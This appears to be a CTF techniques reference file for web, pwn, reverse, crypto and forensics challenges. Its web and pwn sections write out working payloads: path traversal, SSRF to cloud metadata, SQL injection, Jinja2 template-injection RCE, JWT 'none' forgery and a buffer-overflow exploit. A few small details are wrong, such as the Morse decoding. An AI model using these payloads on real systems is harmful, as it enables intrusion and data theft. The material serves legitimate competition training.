---
name: ctf_techniques
description: CTF competition techniques by category — web, pwn, reverse, crypto, forensics, misc
---

# CTF Techniques Reference

## Web Challenges

### Common Web CTF Tricks

```bash
# Source code hints
curl -s http://target/ | grep -i "flag\|CTF\|secret"
curl -s http://target/robots.txt
curl -s http://target/.git/HEAD           # exposed git repo
curl -s http://target/backup.zip          # backup files

# Header inspection
curl -I http://target/
curl -s http://target/ -v 2>&1 | grep -i "x-flag\|flag\|secret"

# Path traversal
curl "http://target/download?file=../../../../etc/passwd"
curl "http://target/download?file=....//....//etc/passwd"
curl "http://target/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# SSRF to localhost
curl "http://target/fetch?url=http://127.0.0.1/"
curl "http://target/fetch?url=http://localhost:6379/"     # Redis
curl "http://target/fetch?url=http://169.254.169.254/"   # AWS metadata

# SQL injection quick test
curl "http://target/api/user?id=1'"    # single quote error?
curl "http://target/api/user?id=1 OR 1=1--"
curl "http://target/api/user?id=1 UNION SELECT 1,flag,3 FROM flags--"
```

### SSTI (Server-Side Template Injection)

```python
# Test payloads (common in CTF web challenges)
{{7*7}}                           # Jinja2/Twig: returns 49
{{config}}                        # Flask: leaks config
{{''.__class__.__mro__[1].__subclasses__()}}  # Python class enumeration
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Jinja2 RCE (Flask CTF)
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('cat /flag').read()}}
# X = index of <class '_frozen_importlib._ModuleLock'> or similar — enumerate with __subclasses__()
```

### JWT Attacks

```bash
# Decode JWT (no verification)
python3 -c "
import base64, json
token = 'eyJh...'
h, p, s = token.split('.')
print(json.loads(base64.b64decode(p + '==').decode()))
"

# Algorithm confusion: change alg to 'none'
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"

# RS256 → HS256 with public key
# Use jwt_tool: pip install jwt_tool
jwt_tool <token> -X k -pk public_key.pem
```

## Binary Exploitation (Pwn)

### Quick Workflow

```bash
# 1. Get binary info
file ./chal
checksec --file ./chal

# 2. Find offset
python3 -c "from pwn import *; print(cyclic(200))" | ./chal 2>&1
# Note crash value → python3 -c "from pwn import *; print(cyclic_find(0x61616161))"

# 3. Find useful addresses
readelf -s ./chal | grep -i "win\|flag\|system\|main"
objdump -d ./chal | grep -A5 "<win>"
nm ./chal | grep -i "win\|flag"

# 4. Run with GDB+GEF
gdb ./chal
# (gdb) run < <(python3 -c "from pwn import *; print(cyclic(200))")
# (gdb) pattern search $rsp
```

### Classic ret2win (No PIE)

```python
from pwn import *
e = ELF('./chal')
p = process('./chal')
win = e.sym['win']              # or: int(input("win addr: "), 16)
payload = b'A' * OFFSET + p64(win)
p.sendlineafter(b'> ', payload)
p.interactive()
```

## Reverse Engineering

### Static Analysis Tools

```bash
# Quick file type and strings
file ./chal
strings ./chal | grep -i "flag\|CTF\|key\|pass"
strings ./chal | grep -E "flag\{[^\}]+\}"   # Flag pattern

# Disassemble
objdump -d ./chal | less
radare2 -A ./chal          # r2: aaa to analyze, pdf @ main to disassemble main

# Decompiler (Ghidra)
ghidraRun                   # open Ghidra GUI
# Or: Dogbolt.org / online decompiler

# Check imports/exports
nm -D ./chal
readelf -a ./chal
ltrace ./chal               # library calls
strace ./chal               # system calls
```

### Anti-Debug / Packing

```bash
# Detect packing
strings ./chal | grep -i "upx\|packed\|UPX0"
entropy ./chal              # high entropy = packed/encrypted

# Unpack UPX
upx -d ./chal -o chal_unpacked

# Dynamic analysis in GDB
gdb ./chal
(gdb) catch syscall ptrace  # catch anti-debug
(gdb) set follow-fork-mode child
```

### Python Bytecode / .pyc

```bash
# Decompile .pyc
pip install uncompyle6
uncompyle6 challenge.pyc > challenge.py

# Or: decompile3 (Python 3.9+)
pip install decompile3
pycdc challenge.pyc

# marshal.loads if .pyc is custom
python3 -c "import marshal,dis; dis.dis(marshal.loads(open('challenge.pyc','rb').read()[16:]))"
```

## Cryptography

### Classic Cipher Identification

```bash
# Frequency analysis → Caesar / Vigenere
python3 -c "
text = 'ENCRYPTED_TEXT'
freq = {}
for c in text.upper():
    if c.isalpha(): freq[c] = freq.get(c, 0) + 1
print(sorted(freq.items(), key=lambda x: -x[1])[:5])
"

# Caesar brute force
python3 -c "
ct = 'URYYB JBEYQ'
for n in range(26):
    print(n, ''.join(chr((ord(c)-65-n)%26+65) if c.isalpha() else c for c in ct.upper()))
"

# XOR brute force (single byte)
python3 -c "
data = bytes.fromhex('1a2b3c4d5e...')
for key in range(256):
    pt = bytes(b ^ key for b in data)
    if pt.isprintable(): print(key, pt)
"
```

### RSA

```python
# Small e (e=3): cube root attack
from sympy import integer_nthroot
c = 0x...   # ciphertext
n = 0x...   # modulus
m, exact = integer_nthroot(c, 3)
if exact: print(bytes.fromhex(hex(m)[2:]))

# Common factor: gcd(n1, n2) != 1
from math import gcd
p = gcd(n1, n2)  # shared prime factor!
q1, q2 = n1 // p, n2 // p

# RSA with known d
from Crypto.PublicKey import RSA
key = RSA.import_key(open('public.pem').read())
n, e = key.n, key.e
# Use RsaCtfTool: python RsaCtfTool.py --publickey pub.pem --uncipher ct.bin
```

## Forensics

### File Analysis

```bash
# Hidden data / steganography
file image.png
exiftool image.png
binwalk image.png
binwalk -e image.png     # extract embedded files

# Strings with file offset
strings -o image.png | grep -i "flag\|CTF"

# LSB steganography (PNG)
pip install stegano
stegano-lsb reveal -i image.png

# Audio steganography
# Audacity: look for spectrogram (View → Spectrogram)
# DeepSound for hidden audio in audio

# Memory forensics
volatility3 -f memory.dmp windows.info
volatility3 -f memory.dmp windows.pslist
volatility3 -f memory.dmp windows.dumpfiles --pid 1234
```

### Network PCAP

```bash
# Wireshark filters
tcp.stream eq 0           # first TCP stream
http.request              # HTTP requests only
frame contains "flag"     # search all frames

# tshark command line
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort -u
tshark -r capture.pcap -Y "ftp-data" -z "follow,tcp,ascii,0"

# Extract files
tshark -r capture.pcap --export-objects http,./extracted_http/
tshark -r capture.pcap --export-objects ftp-data,./extracted_ftp/
```

## Misc / Esoteric

### Common Encodings

```bash
# Base64
echo "dGhpcyBpcyBhIHRlc3Q=" | base64 -d

# Base32
echo "ORSXG5A=" | base32 -d

# Hex
echo "666c61677b74657374" | xxd -r -p

# URL decode
python3 -c "from urllib.parse import unquote; print(unquote('%66%6c%61%67'))"

# Brainfuck interpreter
# https://www.dcode.fr/brainfuck-language

# Morse code
# --- -.-. - ..-. .-.. .- --.  → CTFLag
```

### Flag Format Hunting

```bash
# Common CTF flag formats
grep -r "flag{" . 2>/dev/null
grep -r "CTF{" . 2>/dev/null
grep -r "picoCTF{" . 2>/dev/null
grep -rE "[a-zA-Z0-9_]+\{[^\}]+\}" . 2>/dev/null

# In binary
strings ./chal | grep -E "^[A-Za-z0-9]+\{.+\}$"

# In memory dump
grep -a "flag{" memory.bin
grep -aE "[A-Z]+CTF\{[^\}]+\}" memory.bin
```
